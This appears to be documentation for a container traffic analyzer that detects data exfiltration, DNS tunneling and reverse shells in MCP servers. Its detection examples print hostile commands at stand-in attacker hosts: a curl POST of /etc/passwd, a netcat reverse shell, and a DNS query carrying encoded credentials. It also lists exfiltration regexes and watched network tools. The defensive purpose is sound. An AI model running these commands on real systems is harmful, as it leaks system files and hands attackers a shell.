# Traffic Analyzer - Advanced Network Security Analysis

## Overview

The **Traffic Analyzer** provides comprehensive network security monitoring and data exfiltration detection for containerized MCP implementations, offering real-time analysis of network behavior, DNS patterns, and potential data leakage attempts.

- **Real-Time Network Monitoring** - Live analysis of container network activity
- **Data Exfiltration Detection** - Advanced pattern matching for data theft attempts
- **DNS Tunneling Detection** - Identification of covert DNS communication channels
- **Behavioral Analysis** - ML-based anomaly detection for network behavior
- **Multi-Protocol Coverage** - HTTP/HTTPS, DNS, FTP, email, and custom protocols
- **Sensitive Data Protection** - Detection and masking of exposed credentials and PII

## Architecture

The Traffic Analyzer combines multiple monitoring layers:

```
┌─────────────────────────────────────────────────┐
│              Traffic Analyzer                   │
├─────────────────────────────────────────────────┤
│                                                 │
│ ┌─────────────┐    ┌─────────────────────────┐ │
│ │   Network   │    │    Data Exfiltration    │ │
│ │  Monitoring │◄──►│    Detection Engine     │ │
│ │   Engine    │    │                         │ │
│ └─────────────┘    └─────────────────────────┘ │
│        │                        │              │
│        ▼                        ▼              │
│ ┌──────────────────────────────────────────────┐│
│ │          Analysis Components                 ││
│ ├──────────────────────────────────────────────┤│
│ │ • DNS Tunneling Detector                    ││
│ │ • Behavioral Anomaly Detector               ││
│ │ • Sensitive Data Leakage Scanner            ││
│ │ • Protocol-Specific Analyzers              ││
│ └──────────────────────────────────────────────┘│
└─────────────────────────────────────────────────┘
```

## Network Monitoring Capabilities

### Real-Time Connection Analysis

**Active Connection Monitoring**:
```python
# Monitor network connections from container
async def _monitor_network_connections(self):
    # Check netstat output for active connections
    # Analyze connection patterns and destinations
    # Flag suspicious remote addresses
```

**Process Network Activity**:
```python
# Track network-related processes
processes = ['curl', 'wget', 'nc', 'netcat', 'telnet', 'ssh', 'ftp']
# Monitor command-line arguments for malicious patterns
# Detect reverse shells and tunneling attempts
```

### DNS Security Analysis

**DNS Query Monitoring**:
- Real-time DNS request analysis
- Suspicious domain detection
- Query frequency analysis
- Subdomain pattern recognition

**DNS Tunneling Detection**:
```python
def _detect_dns_tunneling(self, query: str) -> bool:
    # Check for unusually long subdomains
    # Detect Base64-encoded data in DNS queries
    # Analyze query frequency patterns
    # Identify covert communication channels
```

## Data Exfiltration Detection

### Method-Specific Detection

**HTTP/HTTPS Exfiltration**:
```python
# Detect HTTP POST requests with data
ExfiltrationMethod.HTTP: [
    r'curl.*-X POST.*-d',      # curl POST with data
    r'wget.*--post-data',      # wget POST requests
    r'python.*requests\.post', # Python requests library
]
```

**DNS Exfiltration**:
```python
# Detect DNS-based data exfiltration
ExfiltrationMethod.DNS: [
    r'nslookup.*\$\(',  # Command substitution in DNS
    r'dig.*@.*\$\(',    # dig with embedded data
]
```

**Email Exfiltration**:
```python
# Detect email-based data theft
ExfiltrationMethod.EMAIL: [
    r'mail.*-s.*<',     # mail command with file input
    r'sendmail.*<',     # sendmail with file attachment
]
```

### Suspicious Pattern Recognition

**Domain Patterns**:
```python
suspicious_domain_patterns = [
    r'.*\.tk$',                        # Free TLD abuse
    r'.*\.ml$', r'.*\.ga$', r'.*\.cf$', # Suspicious TLDs
    r'.*pastebin\.com.*',              # Data sharing sites
    r'.*discord\.com/api/webhooks.*',  # Discord webhooks
    r'.*ngrok\.io.*',                  # Tunneling services
    r'.*attacker\..*', r'.*evil\..*',  # Obviously malicious
]
```

**Data Patterns**:
```python
exfiltration_patterns = {
    'base64_data': r'[A-Za-z0-9+/]{20,}={0,2}',
    'hex_data': r'[0-9a-fA-F]{32,}',
    'jwt_token': r'eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*',
    'api_key': r'[Aa][Pp][Ii][_]?[Kk][Ee][Yy][=:\s]*[A-Za-z0-9]{20,}',
    'credit_card': r'\b(?:\d{4}[-\s]?){3}\d{4}\b',
}
```

## Sensitive Data Protection

### Data Leakage Detection

**PII Detection**:
```python
sensitive_patterns = {
    'email': r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
    'phone': r'\b\d{3}[-.]?\d{3}[-.]?\d{4}\b',
    'ssn': r'\b\d{3}-\d{2}-\d{4}\b',
    'credit_card': r'\b(?:\d{4}[-\s]?){3}\d{4}\b',
    'api_key': r'[Aa][Pp][Ii][_]?[Kk][Ee][Yy][=:\s]*[A-Za-z0-9]{20,}',
}
```

**Entropy Analysis**:
```python
def _calculate_entropy(self, data: str) -> float:
    # Shannon entropy calculation
    # Detect encrypted/encoded data
    # Threshold: 4.5 bits for suspicious content
```

**Data Masking**:
```python
def _mask_sensitive_data(self, data: str) -> str:
    # Show first 2 and last 2 characters only
    # Example: "sk-1234...abcd" becomes "sk****cd"
    # Prevent credential exposure in logs
```

## Usage

### Automatic Container Monitoring

Start traffic analysis for an MCP container:

```python
from analyzers.traffic_analyzer import TrafficAnalyzer

# Initialize analyzer with container ID
analyzer = TrafficAnalyzer(container_id="mcp_server_123")

# Start comprehensive monitoring
await analyzer.start_monitoring()

# Get real-time analysis
summary = analyzer.get_traffic_summary()
suspicious_activities = analyzer.get_suspicious_activities()
```

### Manual Network Analysis

Direct traffic analysis without containers:

```bash
# Monitor network connections
python -m analyzers.traffic_analyzer --monitor-network --duration 300

# Analyze specific data for exfiltration patterns
python -m analyzers.traffic_analyzer --analyze-data /path/to/network/logs
```

### Integration with Dynamic Analysis

```python
# Integrate with dynamic analyzer
dynamic_analyzer = DynamicAnalyzer()
traffic_analyzer = TrafficAnalyzer(dynamic_analyzer.container_id)

# Start coordinated analysis
await asyncio.gather(
    dynamic_analyzer.start_analysis(),
    traffic_analyzer.start_monitoring()
)
```

## Detection Examples

### DNS Tunneling Detection

**Normal DNS Query**:
```
example.com
```

**Suspicious DNS Query (Detected)**:
```
YWRtaW46cGFzc3dvcmQxMjM=.data.attacker-domain.tk
# Base64 encoded data in subdomain
# Decoded: "admin:password123"
```

### HTTP Exfiltration Detection

**Legitimate HTTP Request**:
```bash
curl -X GET https://api.example.com/data
```

**Malicious HTTP Request (Detected)**:
```bash
curl -X POST https://evil.tk/collect -d "$(cat /etc/passwd)"
# POST request with system file data
```

### Process-Based Detection

**Normal Network Process**:
```
curl -s https://api.github.com/repos/owner/repo
```

**Malicious Network Process (Detected)**:
```bash
nc -e /bin/bash attacker.com 4444
# Netcat reverse shell to suspicious domain
```

## Output Format

### Network Event Detection

```json
{
  "event_type": "suspicious_connection",
  "timestamp": 1641234567.89,
  "source": "172.17.0.2:45678",
  "destination": "suspicious-domain.tk:443",
  "protocol": "tcp",
  "suspicious": true,
  "confidence": 0.9,
  "description": "Connection to known malicious domain",
  "evidence": {
    "domain_pattern": ".*\\.tk$",
    "threat_intel": "Domain associated with malware campaigns"
  }
}
```

### Data Exfiltration Alert

```json
{
  "event_type": "data_exfiltration_attempt",
  "timestamp": 1641234567.89,
  "method": "http",
  "source": "container_process",
  "destination": "external",
  "command": "curl -X POST https://pastebin.com/api -d '***SENSITIVE***'",
  "confidence": 0.95,
  "sensitive_data_detected": [
    {
      "type": "api_key",
      "masked_value": "sk****cd",
      "entropy": 5.2,
      "confidence": 0.8
    }
  ]
}
```

### DNS Tunneling Alert

```json
{
  "event_type": "dns_tunneling",
  "timestamp": 1641234567.89,
  "query": "YWRtaW46cGFzc3dvcmQxMjM=.exfil.attacker.com",
  "decoded_data": "admin:password123",
  "confidence": 0.9,
  "indicators": [
    "base64_encoded_subdomain",
    "suspicious_domain",
    "long_subdomain_length"
  ],
  "threat_level": "high"
}
```

### Traffic Analysis Summary

```json
{
  "total_events": 156,
  "suspicious_events": 8,
  "risk_score": 5.1,
  "event_types": {
    "network_connection": 120,
    "dns_query": 28,
    "data_exfiltration_attempt": 3,
    "suspicious_connection": 5
  },
  "exfiltration_attempts": 3,
  "exfiltration_methods": ["http", "dns"],
  "monitoring_duration": 300.5,
  "threat_indicators": [
    "connections_to_suspicious_domains",
    "base64_data_in_dns_queries",
    "reverse_shell_attempts"
  ]
}
```

## Behavioral Analysis

### Baseline Establishment

```python
# Establish normal behavior baseline
baseline_metrics = [
    {"connection_count": 5, "dns_queries": 12, "data_volume": 1024},
    {"connection_count": 4, "dns_queries": 10, "data_volume": 896},
    {"connection_count": 6, "dns_queries": 15, "data_volume": 1200}
]

anomaly_detector = NetworkAnomalyDetector()
anomaly_detector.establish_baseline(baseline_metrics)
```

### Anomaly Detection

```python
# Detect anomalous behavior
current_metrics = {"connection_count": 25, "dns_queries": 100, "data_volume": 50000}
anomalies = anomaly_detector.detect_anomalies(current_metrics)

# Example anomaly output:
{
    "metric": "dns_queries",
    "current_value": 100,
    "baseline_mean": 12.3,
    "z_score": 8.7,
    "severity": "high",
    "description": "Anomalous dns_queries: 100 (baseline: 12.33)"
}
```

## Configuration

### Monitoring Intervals

```python
MONITORING_CONFIG = {
    'network_connections_interval': 2,    # Check every 2 seconds
    'dns_queries_interval': 1,           # Check every 1 second
    'process_monitoring_interval': 3,    # Check every 3 seconds
    'file_operations_interval': 4,       # Check every 4 seconds
}
```

### Detection Sensitivity

```python
DETECTION_CONFIG = {
    'entropy_threshold': 4.5,            # Minimum entropy for encoded data
    'anomaly_threshold': 2.0,           # Standard deviations from baseline
    'confidence_threshold': 0.7,         # Minimum confidence for alerts
    'dns_query_length_threshold': 20,    # Max normal subdomain length
}
```

### Exclusion Patterns

```python
EXCLUSION_CONFIG = {
    'trusted_domains': [
        'github.com',
        'pypi.org',
        'npmjs.com',
        'docker.io'
    ],
    'ignore_processes': [
        'package_manager',
        'system_updater'
    ],
    'whitelist_patterns': [
        r'127\.0\.0\.1',        # Localhost
        r'10\.0\.0\.\d+',      # Private networks
        r'192\.168\.\d+\.\d+', # Private networks
    ]
}
```

## Performance Considerations

### Resource Usage

- **CPU**: Moderate usage during active monitoring (5-15%)
- **Memory**: ~50-100MB for pattern matching and event storage
- **Network**: Minimal overhead from monitoring commands
- **Disk**: Temporary storage for analysis logs and patterns

### Optimization Features

- **Asynchronous Processing**: Non-blocking concurrent monitoring
- **Pattern Caching**: Compiled regex patterns cached for performance  
- **Event Batching**: Efficient storage and analysis of network events
- **Selective Monitoring**: Focus on suspicious activities to reduce noise

### Scalability

- **Container Limit**: Can monitor multiple containers simultaneously
- **Event History**: Rolling window of 1000+ events per analyzer
- **Memory Management**: Automatic cleanup of old events and patterns
- **Parallel Analysis**: Multiple analysis threads for large datasets

## Best Practices

### Deployment Strategy

1. **Start Monitoring Early**: Begin traffic analysis before MCP server startup
2. **Establish Baselines**: Collect normal behavior data for accurate anomaly detection
3. **Tune Sensitivity**: Adjust thresholds based on environment and requirements
4. **Review Alerts**: Regular analysis of suspicious activity patterns

### False Positive Management

```python
# Configure exclusions for known-good traffic
TRUSTED_PATTERNS = {
    'legitimate_apis': [
        'api.github.com',
        'registry.npmjs.org',
        'pypi.org'
    ],
    'development_domains': [
        'localhost',
        '*.local',
        'dev-server.*'
    ]
}
```

### Security Integration

```python
# Integrate with SIEM systems
def send_security_alert(event):
    siem_client.send_event({
        'source': 'mcp_traffic_analyzer',
        'event_type': event.event_type,
        'severity': event.severity,
        'data': event.to_dict()
    })
```

## Troubleshooting

### Common Issues

**Q: High false positive rate for DNS queries**
A: Adjust DNS query length threshold and add trusted domains

**Q: Missing network events during monitoring**  
A: Verify container permissions and Docker daemon access

**Q: Performance impact on monitored containers**
A: Reduce monitoring frequency and enable selective monitoring

**Q: Sensitive data appearing in logs**
A: Ensure data masking is enabled and review log configurations

### Debug Mode

```bash
# Enable debug logging for traffic analysis
TRAFFIC_ANALYZER_DEBUG=1 python -m analyzers.traffic_analyzer --container-id abc123
```

### Network Diagnostics

```python
# Test network monitoring capabilities
analyzer = TrafficAnalyzer(container_id)
diagnostics = await analyzer.run_network_diagnostics()
print(f"Monitoring capabilities: {diagnostics}")
```

## Version Information

```bash
# Check traffic analyzer capabilities
python -c "
from analyzers.traffic_analyzer import TrafficAnalyzer
print('Supported protocols:', TrafficAnalyzer.get_supported_protocols())
print('Detection methods:', TrafficAnalyzer.get_detection_methods())
print('Monitoring components:', TrafficAnalyzer.get_components())
"
```